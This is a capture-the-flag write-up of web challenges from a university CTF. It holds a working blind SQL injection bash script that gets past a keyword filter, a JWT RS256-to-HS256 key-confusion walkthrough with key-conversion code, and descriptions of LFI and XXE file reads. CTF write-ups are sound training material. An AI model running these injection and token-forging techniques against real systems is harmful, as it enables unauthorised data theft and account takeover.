---
title: WEB - PTITCTF 2025 Preliminary Round
published: 2025-08-27
description: This is our local CTF competition at our Institute. I participated in the Web Exploitation category, and this is my write-up.
image: "./ptitctf.png"
tags: [CTF, Web Exploitation, Exploit]
category: Web Exploitation
draft: false
---

# PTITCTF

# Web0 - Medium

Source code:

<img width="1568" height="510" alt="image" src="https://github.com/user-attachments/assets/d6fe558b-cd06-4e72-8bd5-8227d6d398ea" />  

In function `check()` will block:

- Space, `/` and `\`, comment `- # /*`.
- Keywords: `information|schema|substr|left|right|ascii|hex|...`
- Single character: `b|y|z|_` and `x` (appears alone).

Consequences:

- Can not use space or comment.
- Can not access `information_schema`.
- Can not use `substr/left/right/ascii/hex`.
- Avoid appearing directly `b,y,z,x,_` in user’s input.

This is my Bash script to solve this challenge:

```bash
host='http://103.197.184.163:12113'

HIT(){ curl -s "$host/?user=admin&pass=%27or(if($1,1,0))or%271%27%3D%272" | grep -q 'welcome'; }

T(){ i=$1; cls=$2; pat="%5E%2E%7B$((i-1))%7D$cls"; HIT "%28select%28min%28flag%29%29from%60flag%60%29rlike%27$pat%27"; }

digit_at(){
  i=$1; lo=0; hi=9
  while [ $lo -lt $hi ]; do
    mid=$(( (lo+hi)/2 ))
    set1=$(printf '%%5B0-%d%%5D' "$mid")
    if T "$i" "$set1"; then hi=$mid; else lo=$((mid+1)); fi
  done
  printf '%d' "$lo"
}

lower_aw_at(){
  i=$1

  if   T "$i" %5Ba-g%5D; then L=a; R=g
  elif T "$i" %5Bh-n%5D; then L=h; R=n
  else                    L=o; R=w
  fi

  for blk in a-c d-f g h-j k-m n-p q-s t-v w; do
    case "$blk" in
      a-c) T "$i" %5Ba-c%5D && { range=a-c; break; } ;;
      d-f) T "$i" %5Bd-f%5D && { range=d-f; break; } ;;
      h-j) T "$i" %5Bh-j%5D && { range=h-j; break; } ;;
      k-m) T "$i" %5Bk-m%5D && { range=k-m; break; } ;;
      n-p) T "$i" %5Bn-p%5D && { range=n-p; break; } ;;
      q-s) T "$i" %5Bq-s%5D && { range=q-s; break; } ;;
      t-v) T "$i" %5Bt-v%5D && { range=t-v; break; } ;;
      w)   T "$i" w && { printf w; return; } ;;
    esac
  done
  case "$range" in
    a-c)  T "$i" %5Ba-a%5D && { printf a; return; }
          T "$i" %5Bc-c%5D && { printf c; return; }
          printf b; return ;;            
    d-f)  T "$i" %5Bd-d%5D && { printf d; return; }
          T "$i" %5Bf-f%5D && { printf f; return; }
          printf e; return ;;
    h-j)  T "$i" %5Bh-h%5D && { printf h; return; }
          T "$i" %5Bj-j%5D && { printf j; return; }
          printf i; return ;;
    k-m)  T "$i" %5Bk-k%5D && { printf k; return; }
          T "$i" %5Bm-m%5D && { printf m; return; }
          printf l; return ;;
    n-p)  T "$i" %5Bn-n%5D && { printf n; return; }
          T "$i" %5Bp-p%5D && { printf p; return; }
          printf o; return ;;
    q-s)  T "$i" %5Bq-q%5D && { printf q; return; }
          T "$i" %5Bs-s%5D && { printf s; return; }
          printf r; return ;;
    t-v)  T "$i" %5Bt-t%5D && { printf t; return; }
          T "$i" %5Bv-v%5D && { printf v; return; }
          printf u; return ;;
  esac
}

upper_AW_at(){
  i=$1
  for c in A C D E F G H J K L M N O P Q R S T U V W; do
    cls=$(printf '%%5B%s%%5D' "$c")
    T "$i" "$cls" && { printf '%s' "$c"; return; }
  done
  printf '?'  # unlikely
}

high_at(){
  i=$1
  T "$i" w   && { printf w; return; }
  T "$i" %7B && { printf '{'; return; }
  T "$i" %7C && { printf '|'; return; }
  T "$i" %7D && { printf '}'; return; }
  T "$i" %7E && { printf '~'; return; }
  printf '?' 
}

flag=''
for ((i=1;i<256;i++)); do

  T "$i" %5E%24 && { echo; echo "FLAG: $flag"; break; }

  if   T "$i" %5B0-9%5D;   then ch=$(digit_at "$i")
  elif T "$i" %5Ba-m%5D \
     || T "$i" %5Bn-w%5D;  then ch=$(lower_aw_at "$i")
  elif T "$i" %5BA-M%5D \
     || T "$i" %5BN-W%5D;  then ch=$(upper_AW_at "$i")
  elif T "$i" %5Bw-~%5D;   then ch=$(high_at "$i")
  else                         ch='?'  
  fi

  flag+="$ch"; printf '%s' "$ch"
done
```

```bash
┌──(I3isk3t㉿kali)-[~]
└─$ bash exploit.sh
ptitctf{n0?w4f?c4n?st0p?m3|???????????????^C
```

After fixing the format, `FLAG: PTITCTF{n0_w4f_c4n_st0p_m3}`

# Web1 - Easy

We can easily login using `admin:admin`:

<img width="1651" height="780" alt="image 1" src="https://github.com/user-attachments/assets/25b28219-6312-450e-93de-8c7d8a457946" /> 

This challenge looks like it is vulnerable to a file upload flaw, I tried to exploit that way but it just waste my time, the real vulnerability is LFI (Local File Inclusion).

When I uploaded an image to this web, It created a link to download that image:

<img width="941" height="507" alt="image 2" src="https://github.com/user-attachments/assets/dba541c5-3d82-4ac0-ad03-e3272bb82395" />  

<img width="1037" height="299" alt="image 3" src="https://github.com/user-attachments/assets/f22d8b32-e188-419e-9003-81675abec9ed" />  

I put a LFI payload to test, and it worked!

<img width="1126" height="593" alt="image 4" src="https://github.com/user-attachments/assets/81558027-57fd-4383-a20a-11e50194a632" />  

Okay, then I read environment files to extract sensitive data:

<img width="1124" height="422" alt="image 5" src="https://github.com/user-attachments/assets/27b8203f-8774-48cc-b8aa-2e7b0a239b6f" />  

- Flag is in `/app/this_is_secret_folder_aahahahaha/flag.txt`

Catch the flag:

<img width="1124" height="379" alt="image 6" src="https://github.com/user-attachments/assets/6cf73199-924e-4dc7-ac62-a501bfab01a6" />  

`FLAG: PTITCTF{SQL_nahhhh_P4th_Tr4v3rS1}`

# Web2 - Medium

Access this challenge, register an account and login:

<img width="640" height="164" alt="image 7" src="https://github.com/user-attachments/assets/40abc8b2-3492-4fee-a1c0-04692729d993" />  

So I have to be an admin to access `/admin`:

<img width="1640" height="903" alt="image 8" src="https://github.com/user-attachments/assets/55e36e2a-1966-4f11-8cef-36845f0856f0" />  

Use [jwt.io](http://jwt.io) to decode jwt token:

<img width="1317" height="823" alt="image 9" src="https://github.com/user-attachments/assets/56379899-4fae-4735-bb63-2d9eace85a31" />  

This challenge can be solved using RS256→HS256 (key-confusion), and what is that:

- RS256→HS256 “key-confusion” lets you forge a JWT by swapping `alg` to `HS256` and using the server’s **RSA public key as the HMAC secret**.

## Get JWKS:

Access `/.well-known/jwks.json` :

<img width="1760" height="137" alt="image 10" src="https://github.com/user-attachments/assets/4e2d1bce-4883-4944-88e0-71632f29aff2" />  

```bash
{"keys":[{"alg":"RS256","e":"AQAB","kid":"PTIT-CTF","kty":"RSA","n":"zf1c1FAyg0btbcnxfuQzTQMqpi7RaZ78KQYLT69DgM9lJ6AfkhqUpuLCwK4NL0emQgbj2CkVGvTQKyejhCqQE9RagMgFFl2o2kpJpEIfab08XB0tqJn-q770xUgUQPA1h9PlD2SnHmorVNwOKcKGSj862CryvS2b7Xf3BkKCt_75AlbUGGTS9RumrZIeQYfyVfTERuRtaus3Et2KWwRA_DCAg19k3YGcs2dKqzUZwL-OqogA5PobjrEzlmVuWpe5bIuzW1mP_lkdaEWwJxF2yAZBF_aQlAVYSLMAW3Z2stU3cwLtCb2M2sJOMmn6cG6cBEr3Yw2lgiiQNGne3WJSOw","use":"sig"}]}
```

Create 2 files - `jwks.json` and `token.txt` for later:

<img width="1143" height="309" alt="image 11" src="https://github.com/user-attachments/assets/4bd2430e-6351-4ea6-9c6a-5f054220b0c7" />  

## Extract public.pem from JWKS:

```bash
┌──(I3isk3t㉿165)-[~/usr-tools/jwt_tool]
└─$ python3 - <<'PY'
import json, base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

def b64u(x): x += '='*((4-len(x)%4)%4); return base64.urlsafe_b64decode(x)

j=json.load(open('jwks.json')); k=j['keys'][0]
n=int.from_bytes(b64u(k['n']),'big'); e=int.from_bytes(b64u(k['e']),'big')
pub=rsa.RSAPublicNumbers(e,n).public_key()
open('public.pem','wb').write(pub.public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo))
print("public.pem")
PY
public.pem
```

<img width="546" height="274" alt="image 12" src="https://github.com/user-attachments/assets/8000c1dd-d2ea-49a5-9903-7c4d3dae96d1" />  

## **Verify signatures**

I use `RS256_2_HS256_JWT.py` cuz it is easier than `jwt_tool`:>

<img width="1138" height="351" alt="image 13" src="https://github.com/user-attachments/assets/fced46d4-a698-4a04-ab6a-e34dee11f2ec" />  

Change the token and grab the flag:

<img width="1597" height="939" alt="image 14" src="https://github.com/user-attachments/assets/082e1264-5e32-42f0-afb2-c6e68429f75e" />  

`FLAG:PTITCTF{WOWWW_JSON_W3b_T0k3n}`

# Web3 - Medium

<img width="1915" height="1032" alt="image 15" src="https://github.com/user-attachments/assets/e327f64b-e49a-4002-8dc6-20358ca98dbd" />  

When submit button is clicked, it will send a `POST` request to `/submit_answer`:

<img width="924" height="397" alt="image 16" src="https://github.com/user-attachments/assets/91900e64-daab-4369-989c-b04bebfd4eb6" />  

At first, I said what the fuck and then I think about others `Content-Type` , and I could exploit something like **XXE vulnerability**. So that I tested with `xml` format first.

And it worked:

<img width="1125" height="504" alt="image 17" src="https://github.com/user-attachments/assets/7acc3e27-ce49-458a-bfc3-d270fec55d36" />  

I read file `app.py` to grab all the important information:

<img width="1127" height="847" alt="image 18" src="https://github.com/user-attachments/assets/dbe4a524-e576-477a-9ab6-d699e024156a" />  

Lol, flag is in `/flag_thatsulacothedoanraduocpathnayu_khongthetinnoi.txt`

<img width="1125" height="503" alt="image 19" src="https://github.com/user-attachments/assets/0446ca77-2874-4883-80dd-e99e8b72a0ff" />  

`FLAG: PTITCTF{xml_3xtern41_Ent1Ty_4TT4ck}`

# Web5 - Easy

Lol I thought this was a bug but actually it's a feature…

<img width="583" height="225" alt="b0d60324-d73c-40a2-8de4-cbc69d1b5bd8" src="https://github.com/user-attachments/assets/11170c58-6f49-4f6b-9800-f41e22b869ed" />  

In source code has file `urls.py`:

<img width="647" height="139" alt="image 20" src="https://github.com/user-attachments/assets/cc884d43-5fb2-477e-80ae-62980d21b446" />  

In another file `urls.py`:

<img width="815" height="218" alt="image 21" src="https://github.com/user-attachments/assets/964655ed-491e-400a-98af-85625c254687" />  

I could access those `urlpatterns` with prefix `/api/` , that means:

- `/api/games/`
- `/api/users/`
- `/api/levels/`
- `/api/scoreboard/`
- `/api/releases/`

Access `/api/scoreboard/` and I could see the flag right there:

<img width="1709" height="984" alt="image 22" src="https://github.com/user-attachments/assets/0d029ece-f51e-41a7-a707-9158bb1da526" />  

`FLAG: PTITCTF{ByP4ss_4uth3n_By_G4m3}`
